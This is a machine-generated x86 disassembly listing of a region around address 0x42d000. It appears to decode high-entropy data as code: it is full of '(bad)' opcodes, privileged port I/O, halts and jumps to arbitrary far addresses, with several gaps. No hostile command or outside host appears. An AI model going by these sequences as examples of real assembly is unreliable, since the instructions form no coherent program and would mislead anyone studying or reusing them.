  42d04b:	shl    DWORD PTR [ecx+0x2f],0xe9
  42d04f:	adc    ebp,DWORD PTR [ebx+0x3716c071]
  42d055:	imul   esp,DWORD PTR ds:0x323a74a1,0x522adaea
  42d05f:	hlt    
  42d060:	xchg   edi,eax
  42d061:	sbb    al,0x13
  42d063:	aaa    
  42d064:	add    esi,ebp
  42d066:	adc    DWORD PTR [eax-0x11],esi
  42d069:	and    al,0x65
  42d06b:	out    0x66,al
  42d06d:	ret    0xc658
  42d070:	adc    eax,0xc523141e
  42d075:	mov    esp,0xef101f4c
  42d07a:	pop    ds
  42d07b:	pop    esi
  42d07c:	xlat   BYTE PTR ds:[ebx]
  42d07d:	push   ebp
  42d07e:	repz mov ebp,0x51f80acc
  42d084:	out    dx,eax
  42d085:	in     eax,0x3b
  42d087:	pop    es
  42d088:	enter  0x52d6,0xc9
  42d08c:	push   cs
  42d08d:	cmovp  edi,edx
  42d090:	arpl   bp,ax
  42d092:	mov    al,0x4b
  42d094:	loop   0x42d0c9
  42d096:	adc    al,0x94
  42d098:	push   esp
  42d099:	out    0x79,al
  42d09b:	cdq    
  42d09c:	scas   eax,DWORD PTR es:[edi]
  42d09d:	push   ds
  42d09e:	ins    DWORD PTR es:[edi],dx
  42d09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0a0:	cmp    dl,0x60
  42d0a3:	push   ebx
  42d0a4:	dec    esi
  42d0a5:	arpl   WORD PTR [ecx],bx
  42d0a7:	xchg   ebp,eax
  42d0a8:	mov    WORD PTR [edx],?
  42d0aa:	push   es
  42d0ab:	cmp    eax,0x7355ad24
  42d0b0:	cli    
  42d0b1:	mov    ah,0x58
  42d0b3:	test   eax,0x43c1a448
  42d0b8:	in     al,0x83
  42d0ba:	xchg   esp,eax
  42d0bb:	add    esi,eax
  42d0bd:	mov    eax,ds:0x526c5125
  42d0c2:	inc    esp
  42d0c3:	out    0x30,eax
  42d0c5:	outs   dx,DWORD PTR ds:[esi]
  42d0c6:	mov    ds:0x6aa18269,al
  42d0cb:	fdiv   st(2),st
  42d0cd:	xchg   edi,eax
  42d0ce:	outs   dx,BYTE PTR ds:[esi]
  42d0cf:	push   esi
  42d0d0:	cmp    eax,DWORD PTR ss:[ebx+0x305faf21]
  42d0d7:	xchg   ch,ah
  42d0d9:	rol    DWORD PTR [ecx+0x1564db32],1
  42d0df:	aaa    
  42d0e0:	jmp    ecx
  42d0e2:	imul   esp,DWORD PTR [eax],0x31a49c2f
  42d0e8:	push   edi
  42d0e9:	and    dh,cl
  42d0eb:	out    0x5d,eax
  42d0ed:	xchg   esi,eax
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [edi-0x21],cl
  42d164:	mov    ebp,0x1e367ca
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [ebx],cl
  42d16f:	icebp  
  42d170:	imul   esp,DWORD PTR [ebx],0x4
  42d173:	jnp    0x42d199
  42d175:	stc    
  42d176:	data16 xor dh,BYTE PTR [eax]
  42d179:	fisub  DWORD PTR [ecx+esi*2+0x13]
  42d17d:	js     0x42d161
  42d17f:	fld    QWORD PTR [esi+0x69319390]
  42d185:	addr16 inc esp
  42d187:	in     al,0xfd
  42d189:	lods   eax,DWORD PTR ds:[esi]
  42d18a:	or     esi,DWORD PTR [ecx+0x6607004c]
  42d190:	(bad)  
  42d191:	lods   eax,DWORD PTR ds:[esi]
  42d192:	xor    eax,0x1460fdb4
  42d197:	mov    BYTE PTR [ecx+0x62],dh
  42d19a:	out    0x3f,al
  42d19c:	or     edx,0x33ba3a14
  42d1a2:	sbb    edi,DWORD PTR [esp+esi*8-0x3534bf27]
  42d1a9:	loop   0x42d1ff
  42d1ab:	out    0x5c,al
  42d1ad:	push   esp
  42d1ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1af:	retf   
  42d1b0:	sahf   
  42d1b1:	into   
  42d1b2:	std    
  42d1b3:	mov    DWORD PTR [ebx],ecx
  42d1b5:	pop    edx
  42d1b6:	repnz mov bh,0x99
  42d1b9:	js     0x42d200
  42d1bb:	aad    0xd1
  42d1bd:	retf   
  42d1be:	outs   dx,DWORD PTR ds:[esi]
  42d1bf:	in     al,0x6a
  42d1c1:	pusha  
  42d1c2:	mov    BYTE PTR [ecx-0x1f],ah
  42d1c5:	sub    al,0xb6
  42d1c7:	xchg   esp,eax
  42d1c8:	add    BYTE PTR [ecx-0x6a],ah
  42d1cb:	aaa    
  42d1cc:	and    al,0x17
  42d1ce:	fs imul ebp,edi,0xfde19f9a
  42d1d5:	fdivr  QWORD PTR [edx-0x11cd2be3]
  42d1db:	sbb    al,0x72
  42d1dd:	aas    
  42d1de:	fimul  DWORD PTR [eax+0x26f09e4c]
  42d1e4:	pop    ecx
  42d1e5:	mov    al,ds:0xbbfd7459
  42d1ea:	das    
  42d1eb:	xchg   ecx,eax
  42d1ec:	adc    DWORD PTR [eax+0x36],edx
  42d1ef:	scas   al,BYTE PTR es:[edi]
  42d1f0:	cli    
  42d1f1:	mov    cl,0x3f
  42d1f3:	or     edi,DWORD PTR [esi-0x2da0d630]
  42d1f9:	fdiv   st(7),st
  42d1fb:	push   esi
  42d1fc:	jg     0x42d1d9
  42d1fe:	lds    esp,FWORD PTR [edi]
  42d200:	shl    BYTE PTR [edi-0xa81ba5f],0x87
  42d207:	scas   al,BYTE PTR es:[edi]
  42d208:	iret   
  42d209:	xor    DWORD PTR [edx-0x2c6d0d38],edi
  42d20f:	xchg   DWORD PTR [eax],edx
  42d211:	jmp    DWORD PTR [eax-0x3c]
  42d214:	hlt    
  42d215:	mov    edx,0x52df2fa4
  42d21a:	faddp  st(7),st
  42d21c:	loope  0x42d1a7
  42d21e:	lahf   
  42d21f:	inc    eax
  42d221:	push   0xad05b990
  42d226:	and    eax,0x1e15603a
  42d22b:	(bad)  
  42d22c:	dec    ebp
  42d22d:	je     0x42d254
  42d22f:	lock cmc 
  42d231:	cwde   
  42d232:	jle    0x42d1d6
  42d234:	(bad)  
  42d236:	sbb    ebx,DWORD PTR [edi-0x6bf2cf41]
  42d23c:	mov    ebp,0xad225e8e
  42d241:	mov    ch,0x28
  42d243:	adc    al,0xc0
  42d245:	out    dx,al
  42d246:	fbld   TBYTE PTR [edx-0x2c]
  42d249:	repnz xchg edx,eax
  42d24b:	sbb    al,0x54
  42d24d:	pop    ebp
  42d24e:	xchg   edx,eax
  42d24f:	hlt    
  42d250:	test   DWORD PTR [edx+0x29],edi
  42d253:	push   ebx
  42d254:	les    edi,FWORD PTR [ebp+esi*8+0x3ed9afca]
  42d25b:	cmp    DWORD PTR [eax],ecx
  42d25d:	adc    al,0xd
  42d25f:	test   al,0x39
  42d261:	dec    ecx
  42d262:	test   DWORD PTR [edx],ebx
  42d264:	ret    0x47dc
  42d267:	out    dx,eax
  42d268:	xor    ecx,DWORD PTR [edx-0x8]
  42d26b:	test   ebx,0x1d
	...
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d2f4
  42d2e3:	aaa    
  42d2e4:	shl    BYTE PTR [ebx],cl
  42d2e6:	addr16 in al,0x1
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [eax+0x78029533],dh
  42d2f3:	cmp    al,BYTE PTR [ecx]
  42d2f5:	out    dx,eax
  42d2f6:	adc    cl,ch
  42d2f8:	test   edx,esi
  42d2fa:	rsqrtps xmm2,xmm3
  42d2fd:	or     al,0x9c
  42d2ff:	fidivr WORD PTR [eax-0x318b8847]
  42d305:	xor    al,0xae
  42d307:	push   0xffffffec
  42d309:	fisttp DWORD PTR [ebp+0x162d34e5]
  42d30f:	and    al,0x8f
  42d311:	mov    esi,0xff760e59
  42d316:	inc    ebp
  42d317:	mov    esp,0x587e40d0
  42d31c:	ss pop ecx
  42d31e:	leave  
  42d31f:	lods   eax,DWORD PTR ds:[esi]
  42d320:	mov    esi,0x16bab31d
  42d325:	jp     0x42d36a
  42d327:	dec    ecx
  42d328:	jecxz  0x42d2dd
  42d32a:	sbb    esi,DWORD PTR [ebp-0x3f013009]
  42d330:	dec    BYTE PTR [ebx-0x75a68756]
  42d336:	xchg   edi,eax
  42d337:	out    dx,eax
  42d338:	jle    0x42d2c9
  42d33a:	repz bound ebx,QWORD PTR ds:0x77456c37
  42d341:	pop    ebp
  42d342:	repz mov cl,0x49
  42d345:	into   
  42d346:	shl    esp,cl
  42d348:	push   edx
  42d349:	and    BYTE PTR [edi],0xa2
  42d34c:	cmp    cl,BYTE PTR [ebx+0x554b0709]
  42d352:	xchg   ecx,eax
  42d353:	addr16 mov bh,0x91
  42d356:	cmp    DWORD PTR [edi-0x813f426],eax
  42d35c:	aam    0x7c
  42d35e:	sub    DWORD PTR [ebp-0x22],ecx
  42d361:	xchg   esi,eax
  42d362:	(bad)  
  42d363:	mov    ebp,0x5d3f19c4
  42d368:	es js  0x42d390
  42d36b:	pop    es
  42d36c:	int    0x65
  42d36e:	jne    0x42d35d
  42d370:	mov    ah,bl
  42d372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d373:	arpl   WORD PTR [edi],bp
  42d375:	popa   
  42d376:	sbb    ah,0x84
  42d379:	scas   eax,DWORD PTR es:[edi]
  42d37a:	dec    edx
  42d37b:	lea    ebp,[esi+0x10]
  42d37e:	inc    ebp
  42d37f:	sub    ebp,0x4daf53ca
  42d385:	jge    0x42d397
  42d387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d388:	sub    ch,BYTE PTR [esi-0x59b5bbf3]
  42d38e:	aaa    
  42d38f:	test   dl,cl
  42d391:	or     al,0x4f
  42d393:	jl     0x42d31b
  42d395:	mov    ebx,gs
  42d397:	xchg   esp,eax
  42d398:	sub    dh,BYTE PTR [ebp+0x6e]
  42d39b:	popa   
  42d39c:	mov    ecx,0xc871bfd3
  42d3a1:	stc    
  42d3a2:	loope  0x42d364
  42d3a4:	inc    ebp
  42d3a5:	mov    DWORD PTR [ecx+0x71b72d60],ebx
  42d3ab:	adc    eax,0x84b68cd1
  42d3b0:	sub    BYTE PTR [edx],cl
  42d3b2:	push   ebp
  42d3b3:	xor    dl,dl
  42d3b5:	dec    ebp
  42d3b6:	mul    esi
  42d3b8:	mov    WORD PTR [ebp-0x7cb47b6b],ds
  42d3be:	pusha  
  42d3bf:	adc    eax,DWORD PTR [ecx-0x3]
  42d3c2:	shl    ecx,1
  42d3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3c5:	add    esp,0x46
  42d3c8:	and    al,0x7a
  42d3ca:	(bad)  
  42d3cb:	mov    ch,0xb7
  42d3cd:	call   FWORD PTR [edi+0x5b]
  42d3d0:	push   0xffffffcb
  42d3d2:	ficomp WORD PTR [edx-0x50e64259]
  42d3d8:	xchg   esi,eax
  42d3d9:	das    
  42d3da:	mov    WORD PTR [ebx-0x315f4a9],es
  42d3e0:	fnstcw WORD PTR [ebx]
  42d3e2:	loope  0x42d3af
  42d3e4:	jnp    0x42d452
  42d3e6:	ror    eax,cl
  42d3e8:	fwait
  42d3e9:	fwait
  42d3ea:	jmp    0x42d40e
  42d3ec:	jbe    0x42d417
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	mov    ebp,0x67781694
  42d467:	in     eax,0x1
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [edx],dh
  42d46f:	cmc    
  42d470:	sub    DWORD PTR [eax+0xa],0xcfe647fe
  42d477:	sti    
  42d478:	int    0x7e
  42d47a:	shl    esp,0x74
  42d47d:	out    dx,eax
  42d47e:	aam    0x7a
  42d480:	mov    DWORD PTR [edx+0x4d],0x5bf8271f
  42d487:	add    eax,0xf927b6eb
  42d48c:	dec    esp
  42d48d:	mov    edi,0x2c02eeb
  42d492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d493:	push   ebx
  42d494:	cmc    
  42d495:	mov    ch,BYTE PTR [ecx]
  42d497:	iret   
  42d498:	popf   
  42d499:	pushf  
  42d49a:	fist   DWORD PTR [esi+0x78868d64]
  42d4a0:	arpl   WORD PTR [eax-0x18],bp
  42d4a3:	sbb    ah,BYTE PTR [edi+0x57825da5]
  42d4a9:	push   edx
  42d4aa:	std    
  42d4ab:	lods   al,BYTE PTR ds:[esi]
  42d4ac:	dec    esi
  42d4ad:	dec    eax
  42d4ae:	hlt    
  42d4af:	scas   al,BYTE PTR es:[edi]
  42d4b0:	cmp    BYTE PTR [esi+0x7f],bl
  42d4b3:	push   eax
  42d4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4b5:	cmp    BYTE PTR [edi-0xa],dl
  42d4b8:	and    dh,dh
  42d4ba:	fcomp  QWORD PTR [esi+0x21ff732e]
  42d4c0:	test   al,0xb9
  42d4c2:	add    BYTE PTR [esi-0x38],ah
  42d4c5:	pop    edx
  42d4c6:	sub    BYTE PTR [ecx+0xc],ah
  42d4c9:	xor    al,0x1a
  42d4cb:	mov    ebp,0xc9e761d3
  42d4d0:	xor    eax,0xd96303bf
  42d4d5:	xchg   esi,eax
  42d4d6:	sbb    eax,0xba22fd33
  42d4db:	mov    ecx,DWORD PTR [ebp+0x2f120969]
  42d4e1:	stos   DWORD PTR es:[edi],eax
  42d4e2:	lds    edi,FWORD PTR [esp+ebp*1-0xe]
  42d4e6:	sub    BYTE PTR [edx],bh
  42d4e8:	mov    eax,0xaf28d6b1
  42d4ed:	jo     0x42d4e2
  42d4ef:	inc    esp
  42d4f0:	push   cs
  42d4f1:	popa   
  42d4f2:	idiv   DWORD PTR [edx-0x68]
  42d4f5:	ret    
  42d4f6:	mov    cl,0x4a
  42d4f8:	sbb    bh,BYTE PTR [ecx-0x4f]
  42d4fb:	cmp    eax,0x48069502
  42d500:	cli    
  42d501:	dec    eax
  42d502:	adc    DWORD PTR [esi],esp
  42d504:	aad    0x7e
  42d506:	pop    es
  42d507:	adc    edx,edx
  42d509:	jne    0x42d57b
  42d50b:	xchg   ebx,eax
  42d50c:	shl    ch,cl
  42d50e:	cli    
  42d50f:	sbb    eax,0x22e934e3
  42d514:	fcom   st(3)
  42d516:	xor    BYTE PTR [ecx],bl
  42d518:	fsubr  QWORD PTR [edx+0xc77ef57]
  42d51e:	retf   
  42d51f:	pop    esi
  42d520:	mov    edi,0xc1d788db
  42d525:	lea    edx,[eax+0x639ab0df]
  42d52b:	add    eax,0x2def7029
  42d530:	cmp    BYTE PTR [ecx],dh
  42d532:	jmp    0xea2d:0x95e53408
  42d539:	push   es
  42d53a:	nop
  42d53b:	test   ch,0x1
  42d53e:	dec    esi
  42d53f:	pop    ebx
  42d540:	and    dh,BYTE PTR [ecx-0x5402f09]
  42d546:	outs   dx,BYTE PTR ds:[esi]
  42d547:	stc    
  42d548:	xor    eax,esp
  42d54a:	in     al,0x98
  42d54c:	or     ebp,DWORD PTR [ecx+0x2581b228]
  42d552:	adc    al,0x83
  42d554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d555:	cmp    ebx,eax
  42d557:	jecxz  0x42d555
  42d559:	sbb    esi,ebx
  42d55b:	dec    ebx
  42d55c:	cmc    
  42d55d:	cmp    al,0x3b
  42d55f:	(bad)  
  42d560:	aam    0xb0
  42d562:	cmp    eax,0x43037337
  42d567:	popa   
  42d568:	loope  0x42d547
  42d56a:	leave  
  42d56b:	loope  0x42d506
  42d56d:	xchg   BYTE PTR [eax],al
	...
  42d5d3:	add    BYTE PTR [eax],al
  42d5d5:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d5db:	ja     0x42d5b6
  42d5dd:	call   FWORD PTR [ebp+0x3e]
  42d5e0:	mov    ds:0x7d9f4ed5,eax
  42d5e5:	inc    ebx
  42d5e6:	addr16 out 0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    bh,ah
  42d5ef:	outs   dx,DWORD PTR ds:[esi]
  42d5f0:	in     al,dx
  42d5f1:	sbb    DWORD PTR [ebx],ebx
  42d5f3:	aad    0x7f
  42d5f5:	cs cs jns 0x42d5f0
  42d5f9:	sbb    BYTE PTR [ebx-0x4e],bh
  42d5fc:	xchg   ebx,eax
  42d5fd:	mov    ebx,0xa4175168
  42d602:	xor    ch,BYTE PTR [ecx]
  42d604:	and    DWORD PTR [edx],0x54eb5382
  42d60a:	mov    BYTE PTR [esi-0x24],cl
  42d60d:	fs aam 0x7f
  42d610:	out    0xad,eax
  42d612:	and    DWORD PTR [ecx],ebp
  42d614:	loope  0x42d614
  42d616:	mov    bh,0x36
  42d618:	imul   edx,DWORD PTR [edx+0x16],0xffffff89
  42d61c:	xor    al,0x53
  42d61e:	mov    al,0xf1
  42d620:	jnp    0x42d625
  42d622:	adc    al,0x35
  42d624:	hlt    
  42d625:	xchg   BYTE PTR [eax-0xf],dl
  42d628:	popa   
  42d629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d62a:	mov    ch,0xcc
  42d62c:	mov    ebp,0xca03be41
  42d631:	inc    ebx
  42d632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d633:	cs add al,0xe0
  42d636:	xor    BYTE PTR [esi],cl
  42d638:	pslld  mm5,QWORD PTR [ebx+0x34]
  42d63c:	push   ebp
  42d63d:	cld    
  42d63e:	js     0x42d6a0
  42d640:	das    
  42d641:	fwait
  42d642:	sub    BYTE PTR ds:0x5d3ac0e7,ah
  42d648:	jl     0x42d62b
  42d64a:	test   eax,0x6a7967eb
  42d64f:	shl    DWORD PTR [ebx+0x3ab544cf],0x85
  42d656:	test   bh,bh
  42d658:	fwait
  42d659:	pop    ds
  42d65a:	push   0x79d4b093
  42d65f:	ror    DWORD PTR [ebx],cl
  42d661:	ja     0x42d69d
  42d663:	adc    edi,0xffffffc2
  42d666:	dec    esp
  42d667:	test   eax,0x10b2891e
  42d66c:	popa   
  42d66d:	jno    0x42d67a
  42d66f:	in     eax,0xbc
  42d671:	inc    edx
  42d672:	inc    ecx
  42d673:	call   0x2c5b2107
  42d678:	sbb    eax,0x727daf28
  42d67d:	xor    BYTE PTR [edi+0x1a],ah
  42d680:	int    0x96
  42d682:	push   esi
  42d683:	xlat   BYTE PTR ds:[ebx]
  42d684:	sub    DWORD PTR [ebp+0x58],edi
  42d687:	test   eax,0x41a3c108
  42d68c:	push   ss
  42d68d:	inc    esi
  42d68e:	mov    al,0x62
  42d690:	add    al,0xf1
  42d692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d693:	shr    eax,cl
  42d695:	je     0x42d6d2
  42d697:	repnz mov ch,0x6d
  42d69a:	sub    DWORD PTR [edi],esi
  42d69c:	push   ds
  42d69d:	mov    cl,0x3f
  42d69f:	loope  0x42d666
  42d6a1:	fidivr DWORD PTR [ecx+0x7a]
  42d6a4:	mov    ds:0x86adcba8,al
  42d6a9:	aas    
  42d6aa:	dec    bp
  42d6ac:	clc    
  42d6ad:	(bad)  
  42d6ae:	out    0xeb,al
  42d6b0:	(bad)  
  42d6b1:	pop    ebx
  42d6b2:	(bad)  
  42d6b3:	sub    al,0x61
  42d6b5:	into   
  42d6b6:	and    edx,DWORD PTR [ecx]
  42d6b8:	gs out 0xc4,eax
  42d6bb:	sbb    ebx,ebp
  42d6bd:	jae    0x42d695
  42d6bf:	add    cl,BYTE PTR [edx-0xc77b2c5]
  42d6c5:	xchg   edi,eax
  42d6c6:	pushf  
  42d6c7:	dec    esp
  42d6c8:	jge    0x42d6e7
  42d6ca:	repnz daa 
  42d6cc:	rol    dl,1
  42d6ce:	mov    al,BYTE PTR [edi-0x6c]
  42d6d1:	push   edi
  42d6d2:	hlt    
  42d6d3:	or     DWORD PTR [edi+ecx*4-0x3c298db6],eax
  42d6da:	popf   
  42d6db:	or     eax,edx
  42d6dd:	cmp    eax,0x1ba1dbae
  42d6e2:	outs   dx,BYTE PTR ds:[esi]
  42d6e3:	inc    ebp
  42d6e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6e5:	push   esp
  42d6e6:	jae    0x42d68a
  42d6e8:	ins    DWORD PTR es:[edi],dx
  42d6e9:	push   ss
  42d6ea:	cmp    BYTE PTR [edi],cl
  42d6ec:	ins    BYTE PTR es:[edi],dx
  42d6ed:	and    BYTE PTR [eax],al
	...
  42d753:	add    BYTE PTR [eax],al
  42d755:	add    bl,dh
  42d757:	add    esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x59
  42d763:	fwait
  42d764:	or     al,0x2d
  42d766:	addr16 out 0x1,eax
  42d769:	add    BYTE PTR [eax],al
  42d76b:	add    DWORD PTR [eax],eax
  42d76d:	add    BYTE PTR [ebp-0x489ad1db],bh
  42d773:	bound  esp,QWORD PTR [edi+0x2]
  42d776:	xor    DWORD PTR [esi],ebp
  42d778:	pop    eax
  42d779:	bound  ebp,QWORD PTR [ebx*8+0x410f5260]
  42d780:	mov    esp,0xbae5852b
  42d785:	ss pop ds
  42d787:	adc    dl,BYTE PTR [edi-0x76]
  42d78a:	dec    eax
  42d78b:	jae    0x42d760
  42d78d:	jo     0x42d793
  42d78f:	aas    
  42d790:	lds    esp,FWORD PTR ds:0xcb368aeb
  42d796:	into   
  42d797:	mov    ah,0x1d
  42d799:	xchg   edi,eax
  42d79a:	out    0xe6,eax
  42d79c:	je     0x42d7e2
  42d79e:	scas   al,BYTE PTR es:[edi]
  42d79f:	mov    esp,0x17fecaaa
  42d7a4:	adc    BYTE PTR [edi-0xa353db4],ah
  42d7aa:	ds push ebx
  42d7ac:	js     0x42d798
  42d7ae:	dec    ecx
  42d7af:	xor    esp,esp
  42d7b1:	rol    DWORD PTR [esi],1
  42d7b3:	ds jns 0x42d7ba
  42d7b6:	loopne 0x42d74e
  42d7b8:	rol    edi,cl
  42d7ba:	cwde   
  42d7bb:	mov    edx,0x405f0f13
  42d7c0:	xor    dh,BYTE PTR [ebp+0x36]
  42d7c3:	adc    BYTE PTR [esi+0xc4af244],al
  42d7c9:	fistp  QWORD PTR [ebx]
  42d7cb:	and    BYTE PTR [esi],dh
  42d7cd:	shr    DWORD PTR [edi-0xa],0x47
  42d7d1:	in     eax,0xef
  42d7d3:	nop
  42d7d4:	mov    cl,al
  42d7d6:	test   al,0x19
  42d7d8:	pushf  
  42d7d9:	jnp    0x42d811
  42d7db:	outs   dx,DWORD PTR ds:[esi]
  42d7dc:	sbb    edi,DWORD PTR [ebx+0x52]
  42d7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7e0:	push   ds
  42d7e1:	jle    0x42d7d0
  42d7e3:	jecxz  0x42d7d6
  42d7e5:	mov    esp,0xee820ff0
  42d7ea:	lahf   
  42d7eb:	scas   eax,DWORD PTR es:[edi]
  42d7ec:	mov    cl,0x9a
  42d7ee:	inc    ebp
  42d7ef:	call   0x10dd:0x11abf79d
  42d7f6:	adc    dl,BYTE PTR [edi+eax*4]
  42d7f9:	xchg   ebp,eax
  42d7fa:	jae    0x42d841
  42d7fc:	xchg   edx,eax
  42d7fd:	push   eax
  42d7fe:	add    eax,edx
  42d800:	rcr    bl,cl
  42d802:	adc    eax,0x2a530d87
  42d807:	daa    
  42d808:	sub    eax,0x8f6a898
  42d80d:	cmp    edi,ebp
  42d80f:	outs   dx,BYTE PTR ds:[esi]
  42d810:	adc    dh,BYTE PTR [ecx-0x21]
  42d813:	jp     0x42d836
  42d815:	push   esp
  42d816:	inc    esp
  42d817:	aad    0xe7
  42d819:	aas    
  42d81a:	mov    al,ds:0xa273f76d
  42d81f:	push   ecx
  42d820:	adc    bl,BYTE PTR [eax-0x473c197]
  42d826:	rol    DWORD PTR [ebp+0x1d],1
  42d829:	(bad)  
  42d82a:	push   ebx
  42d82b:	mov    ch,0xa3
  42d82d:	ss mov ah,0x90
  42d830:	mov    ah,0x34
  42d832:	inc    edx
  42d833:	ret    0x4e5c
  42d836:	lds    ebx,FWORD PTR [edi]
  42d838:	mov    eax,0xac2de943
  42d83d:	imul   ecx,DWORD PTR [ecx],0x38
  42d840:	(bad)  
  42d842:	fdiv   st(7),st
  42d844:	pop    edi
  42d845:	cmp    al,0x1b
  42d848:	adc    edx,DWORD PTR [eax+edx*8]
  42d84b:	mov    bl,0x83
  42d84d:	adc    eax,0x66
  42d850:	cmp    dh,BYTE PTR [ecx+0x4f3f1619]
  42d856:	push   edi
  42d857:	shl    bh,0x68
  42d85a:	ds jp  0x42d8cb
  42d85d:	or     ecx,DWORD PTR [edi]
  42d85f:	jo     0x42d7fc
  42d861:	add    eax,0xdbcdc832
  42d866:	adc    esp,DWORD PTR [ebx+0x1b030fd1]
  42d86c:	mov    esi,0xd4
	...
  42d8d5:	add    BYTE PTR [esi-0x62a06765],dl
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0x97c6961a
  42d8e3:	mov    edx,0xe86772cf
  42d8e8:	add    DWORD PTR [eax],eax
  42d8ea:	add    BYTE PTR [ecx],al
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	cld    
  42d8ef:	sub    eax,0x2edfbbc3
  42d8f4:	rcl    DWORD PTR [edi+0x23766d0c],1
  42d8fa:	sahf   
  42d8fb:	pop    ecx
  42d8fc:	into   
  42d8fd:	shl    esi,0x62
  42d900:	push   cs
  42d901:	repz into 
  42d903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d904:	loopne 0x42d951
  42d906:	(bad)  
  42d907:	(bad)  
  42d909:	in     eax,dx
  42d90a:	xor    BYTE PTR [ebx],dl
  42d90c:	cmp    BYTE PTR [edi-0x36],dh
  42d90f:	ds jmp 0x4997:0x67f7c56d
  42d917:	jnp    0x42d95f
  42d919:	xor    eax,0x3cb7ac8c
  42d91e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d91f:	add    ah,BYTE PTR [edi-0x1de88b4a]
  42d925:	add    BYTE PTR [esi+eiz*8-0x30],dh
  42d929:	(bad)  
  42d92a:	bound  edi,QWORD PTR [esi+0x56]
  42d92d:	pusha  
  42d92e:	lea    ebp,[edx]
  42d930:	cmp    bl,dl
  42d932:	pop    eax
  42d933:	ret    0x59d3
  42d936:	add    dl,BYTE PTR [edx]
  42d938:	pop    esi
  42d939:	xor    bl,BYTE PTR [eax+eiz*1+0x27]
  42d93d:	pop    ecx
  42d93e:	mov    eax,DWORD PTR ds:[edx-0x5a]
  42d942:	fsub   st(1),st
  42d944:	lds    edi,FWORD PTR [ecx-0x2d8a63a5]
  42d94a:	pop    es
  42d94b:	sub    esi,edi
  42d94d:	fs mov bl,0xea
  42d950:	mov    ah,0xdc
  42d952:	jl     0x42d8e3
  42d954:	mov    cl,0xce
  42d956:	mov    ds:0x68d77e8f,al
  42d95b:	icebp  
  42d95c:	sbb    esi,DWORD PTR ds:0xa565625
  42d962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d963:	xchg   esi,eax
  42d964:	in     al,dx
  42d965:	mov    esi,DWORD PTR [ecx-0x1c68ac61]
  42d96b:	cmp    ch,BYTE PTR [ebx-0x30]
  42d96e:	inc    ebx
  42d96f:	pop    esp
  42d970:	std    
  42d971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d972:	xor    eax,0x810c6b94
  42d977:	jne    0x42d90f
  42d979:	pusha  
  42d97a:	cdq    
  42d97b:	loop   0x42d993
  42d97d:	arpl   WORD PTR [edi+ebp*1],ax
  42d980:	cwde   
  42d981:	push   ds
  42d982:	sub    dh,BYTE PTR [ecx+edx*2]
  42d985:	arpl   WORD PTR ds:0x57efedcb,bx
  42d98b:	rol    BYTE PTR [edx-0x6bc1b0ca],cl
  42d991:	(bad)  
  42d992:	in     al,0xd5
  42d994:	push   ebx
  42d995:	outs   dx,BYTE PTR ds:[esi]
  42d996:	jmp    0x53380307
  42d99b:	mov    ebx,0x490a5093
  42d9a0:	jmp    0x57d0:0xcd28b222
  42d9a7:	add    bl,BYTE PTR [edx]
  42d9a9:	mov    bl,0xea
  42d9ab:	inc    ebx
  42d9ac:	sub    eax,DWORD PTR [edi]
  42d9ae:	imul   esp,DWORD PTR [edi],0xffffffd5
  42d9b1:	cld    
  42d9b2:	(bad)  
  42d9b3:	icebp  
  42d9b4:	dec    esp
  42d9b5:	pop    ebp
  42d9b6:	jmp    0x2ba153b7
  42d9bb:	or     al,BYTE PTR [edx+eax*8+0x36b7574b]
  42d9c2:	sbb    BYTE PTR [edx],cl
  42d9c4:	push   ebp
  42d9c5:	loope  0x42da02
  42d9c7:	aad    0x78
  42d9c9:	out    0x31,al
  42d9cb:	sbb    eax,0xfe47a6e6
  42d9d0:	leave  
  42d9d1:	and    esi,DWORD PTR [ebp-0x200b25b9]
  42d9d7:	pop    esp
  42d9d8:	pop    es
  42d9d9:	add    eax,0x1c2dbf25
  42d9de:	and    al,0x54
  42d9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
